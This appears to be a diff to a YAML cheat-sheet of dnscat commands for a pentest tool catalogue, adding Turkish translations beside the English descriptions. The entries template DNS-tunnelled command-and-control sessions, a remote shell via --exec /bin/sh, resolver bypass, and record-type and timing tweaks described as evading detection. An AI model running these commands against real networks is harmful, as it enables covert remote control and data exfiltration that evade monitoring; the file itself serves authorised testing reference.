@@ -3,76 +3,153 @@ tags: [network, dns, exfiltration, c2, security, pentest, tunnel]
 
 actions:
 # === BASIC CONNECTIVITY ===
- - title: dnscat - basic command session
-   desc: |
-     Establishes a default interactive command session with a dnscat server over DNS. 
-     This mode is the most common way to start a C2 (Command and Control) channel through DNS queries. 
-     It uses the system's default DNS settings to resolve the specified domain and communicate with the listener.
+ - title:
+     en: dnscat - basic command session
+     tr: dnscat - Temel komut oturumu
+   desc:
+     en: |
+       Establishes a default interactive command session with a dnscat server over DNS. 
+       This mode is the most common way to start a C2 (Command and Control) channel through DNS queries. 
+       It uses the system's default DNS settings to resolve the specified domain and communicate with the listener.
+     tr: |
+       DNS üzerinden dnscat sunucusuyla varsayılan etkileşimli komut oturumu kurar. DNS sorguları
+       içinden geçen bir C2 (Komut ve Kontrol) kanalı başlatmanın en yaygın yoludur. Belirtilen alan
+       adını çözümlemek ve dinleyiciyle haberleşmek için sistemin varsayılan DNS ayarlarını
+       kullanır.
    command: "dnscat --dns domain={{domain}}"
 
- - title: dnscat - connectivity ping
-   desc: |
-     Performs a simple connectivity check to verify if a dnscat server is listening on the target domain. 
-     Use this to troubleshoot connection issues or verify the environment's DNS egress before attempting a full session. 
-     If the server responds, it indicates that DNS traffic is successfully reaching the controller.
+ - title:
+     en: dnscat - connectivity ping
+     tr: dnscat - Bağlantı denetimi
+   desc:
+     en: |
+       Performs a simple connectivity check to verify if a dnscat server is listening on the target domain. 
+       Use this to troubleshoot connection issues or verify the environment's DNS egress before attempting a full session. 
+       If the server responds, it indicates that DNS traffic is successfully reaching the controller.
+     tr: |
+       Hedef alan adındaki dnscat sunucusunun dinleyip dinlemediğini anlamak için yalın bir bağlantı
+       denetimi yapar. Tam oturum denemeden önce bağlantı sorunlarını gidermek ya da ortamın DNS
+       çıkışını doğrulamak için kullanılır. Sunucu yanıt verirse DNS trafiğinin denetleyiciye
+       ulaştığı anlaşılır.
    command: "dnscat --dns domain={{domain}} --ping"
 
 # === SHELLS AND EXECUTION ===
- - title: dnscat - execute process (bind shell)
-   desc: |
-     Executes a specific process on the client and links its input/output to the DNS stream. 
-     This is commonly used to provide a remote shell (like /bin/sh or cmd.exe) to the dnscat server. 
-     Be aware that this exposes the client's command line to the server administrator.
+ - title:
+     en: dnscat - execute process (bind shell)
+     tr: dnscat - İşlem çalıştırma (bind kabuk)
+   desc:
+     en: |
+       Executes a specific process on the client and links its input/output to the DNS stream. 
+       This is commonly used to provide a remote shell (like /bin/sh or cmd.exe) to the dnscat server. 
+       Be aware that this exposes the client's command line to the server administrator.
+     tr: |
+       İstemcide belirli bir işlemi çalıştırıp girdisini çıktısını DNS akışına bağlar. dnscat
+       sunucusuna uzak kabuk (/bin/sh ya da cmd.exe gibi) sağlamak için yaygın şekilde kullanılır.
+       Bu kipte istemcinin komut satırının sunucu yöneticisine açıldığına dikkat edilmelidir.
    command: "dnscat --dns domain={{domain}} --exec {{process|/bin/sh}}"
 
- - title: dnscat - interactive console mode
-   desc: |
-     Starts a session where input and output are sent directly to the local console. 
-     This mode is useful for manual data transfer or direct communication between the client and server operators. 
-     It bypasses the default 'command' session logic to provide a raw data stream.
+ - title:
+     en: dnscat - interactive console mode
+     tr: dnscat - Etkileşimli konsol kipi
+   desc:
+     en: |
+       Starts a session where input and output are sent directly to the local console. 
+       This mode is useful for manual data transfer or direct communication between the client and server operators. 
+       It bypasses the default 'command' session logic to provide a raw data stream.
+     tr: |
+       Girdi ve çıktının doğrudan yerel konsola aktarıldığı bir oturum başlatır. İstemciyle sunucu
+       işleticileri arasında elle veri aktarımı ya da doğrudan haberleşme için yararlıdır.
+       Varsayılan komut oturumu mantığını atlayarak ham veri akışı sağlar.
    command: "dnscat --dns domain={{domain}} --console"
 
 # === SECURITY AND AUTHENTICATION ===
- - title: dnscat - authenticated session with secret
-   desc: |
-     Sets a shared secret to enable encryption and prevent man-in-the-middle (MITM) attacks. 
-     The same secret must be configured on both the client and the server for the connection to succeed. 
-     This is highly recommended for production or sensitive engagements to ensure session integrity.
+ - title:
+     en: dnscat - authenticated session with secret
+     tr: dnscat - Gizli değerle kimlik doğrulamalı oturum
+   desc:
+     en: |
+       Sets a shared secret to enable encryption and prevent man-in-the-middle (MITM) attacks. 
+       The same secret must be configured on both the client and the server for the connection to succeed. 
+       This is highly recommended for production or sensitive engagements to ensure session integrity.
+     tr: |
+       Şifrelemeyi etkinleştirmek ve ortadaki adam (MITM) saldırılarını engellemek için paylaşılan
+       bir gizli değer tanımlar. Bağlantının kurulması için aynı gizli değerin hem istemcide hem
+       sunucuda yapılandırılması gerekir. Oturum bütünlüğünü korumak amacıyla hassas ya da üretim
+       kapsamlı çalışmalarda kesinlikle önerilir.
    command: "dnscat --dns domain={{domain}} --secret {{secret_key}}"
 
- - title: dnscat - disable encryption
-   desc: |
-     Explicitly disables all encryption and authentication for the DNS session. 
-     Use this only for debugging or in environments where the encryption overhead causes significant performance issues. 
-     Note that all transmitted data will be visible in plaintext to anyone monitoring the DNS traffic.
+ - title:
+     en: dnscat - disable encryption
+     tr: dnscat - Şifrelemeyi kapatma
+   desc:
+     en: |
+       Explicitly disables all encryption and authentication for the DNS session. 
+       Use this only for debugging or in environments where the encryption overhead causes significant performance issues. 
+       Note that all transmitted data will be visible in plaintext to anyone monitoring the DNS traffic.
+     tr: |
+       DNS oturumundaki bütün şifreleme ve kimlik doğrulamayı açıkça kapatır. Yalnızca hata ayıklama
+       ya da şifreleme yükünün ciddi başarım sorunlarına yol açtığı ortamlarda kullanılmalıdır.
+       Aktarılan bütün verinin DNS trafiğini izleyen herkesçe düz metin görülebileceği
+       unutulmamalıdır.
    command: "dnscat --dns domain={{domain}} --no-encryption"
 
 # === NETWORK TUNING ===
- - title: dnscat - custom upstream DNS server
-   desc: |
-     Forces the client to send DNS queries to a specific upstream server instead of the system default. 
-     This is useful when you need to bypass a restrictive local DNS resolver or target a specific internal nameserver. 
-     The server parameter specifies the IP address of the DNS resolver to use for the tunnel.
+ - title:
+     en: dnscat - custom upstream DNS server
+     tr: dnscat - Özel yukarı akış DNS sunucusu
+   desc:
+     en: |
+       Forces the client to send DNS queries to a specific upstream server instead of the system default. 
+       This is useful when you need to bypass a restrictive local DNS resolver or target a specific internal nameserver. 
+       The server parameter specifies the IP address of the DNS resolver to use for the tunnel.
+     tr: |
+       İstemciyi, sistem varsayılanı yerine DNS sorgularını belirli bir yukarı akış sunucusuna
+       göndermeye zorlar. Kısıtlayıcı yerel çözümleyiciyi atlamak ya da belirli bir dahili ad
+       sunucusunu hedeflemek gerektiğinde yararlıdır. Sunucu parametresi, tünel için kullanılacak
+       DNS çözümleyicinin IP adresini belirtir.
    command: "dnscat --dns domain={{domain}},server={{dns_server|8.8.8.8}}"
 
- - title: dnscat - specify DNS record types
-   desc: |
-     Restricts the tunnel to use specific DNS record types such as TXT, MX, or CNAME. 
-     Different environments may monitor or block certain record types, so switching can help with evasion. 
-     You can provide a single type or a comma-separated list of preferred types.
+ - title:
+     en: dnscat - specify DNS record types
+     tr: dnscat - DNS kayıt türü belirtme
+   desc:
+     en: |
+       Restricts the tunnel to use specific DNS record types such as TXT, MX, or CNAME. 
+       Different environments may monitor or block certain record types, so switching can help with evasion. 
+       You can provide a single type or a comma-separated list of preferred types.
+     tr: |
+       Tüneli TXT, MX ya da CNAME gibi belirli DNS kayıt türleriyle sınırlar. Farklı ortamlar
+       belirli kayıt türlerini izleyebilir ya da engelleyebilir; tür değiştirmek atlatmaya yardımcı
+       olur. Tek tür ya da virgülle ayrılmış yeğlenen tür listesi verilebilir.
    command: "dnscat --dns domain={{domain}},type={{record_types|TXT,CNAME,MX}}"
 
- - title: dnscat - stealth and timing control
-   desc: |
-     Adjusts the delay between packets and forces a steady transmission rate to avoid detection. 
-     Increasing the delay can help bypass basic rate-limiting or anomaly detection systems. 
-     The steady flag ensures the client waits the full delay period even if a response is received immediately.
+ - title:
+     en: dnscat - stealth and timing control
+     tr: dnscat - Gizlilik ve zamanlama ayarı
+   desc:
+     en: |
+       Adjusts the delay between packets and forces a steady transmission rate to avoid detection. 
+       Increasing the delay can help bypass basic rate-limiting or anomaly detection systems. 
+       The steady flag ensures the client waits the full delay period even if a response is received immediately.
+     tr: |
+       Paket aralarındaki gecikmeyi ayarlar ve tespitten kaçınmak için düzenli bir aktarım hızı
+       dayatır. Gecikmeyi artırmak, temel hız sınırlama ya da anormallik tespit düzeneğini atlatmaya
+       yardımcı olur. --steady bayrağı, yanıt hemen gelse bile istemcinin gecikme süresinin tamamını
+       beklemesini sağlar.
    command: "dnscat --dns domain={{domain}} --delay {{delay_ms|2000}} --steady"
 
 # === DEBUGGING ===
- - title: dnscat - packet trace debugging
-   desc: |
-     Enables detailed packet tracing to display every incoming and outgoing dnscat packet. 
-     This is essential for debugging complex network paths or understanding how the protocol is being handled by intermediate firewalls. 
-     It provides a granular view of the hex-encoded data being sent over the DNS protocol.
+ - title:
+     en: dnscat - packet trace debugging
+     tr: dnscat - Paket iziyle hata ayıklama
+   desc:
+     en: |
+       Enables detailed packet tracing to display every incoming and outgoing dnscat packet. 
+       This is essential for debugging complex network paths or understanding how the protocol is being handled by intermediate firewalls. 
+       It provides a granular view of the hex-encoded data being sent over the DNS protocol.
+     tr: |
+       Gelen ve giden bütün dnscat paketlerini göstermek için ayrıntılı paket izlemeyi
+       etkinleştirir. Karmaşık ağ yollarında hata ayıklamak ya da araya giren güvenlik duvarlarının
+       iletişim kuralını nasıl işlediğini anlamak için vazgeçilmezdir. DNS iletişim kuralı üzerinden
+       taşınan onaltılık kodlanmış verinin ayrıntılı görünümünü verir.
    command: "dnscat --dns domain={{domain}} --packet-trace"
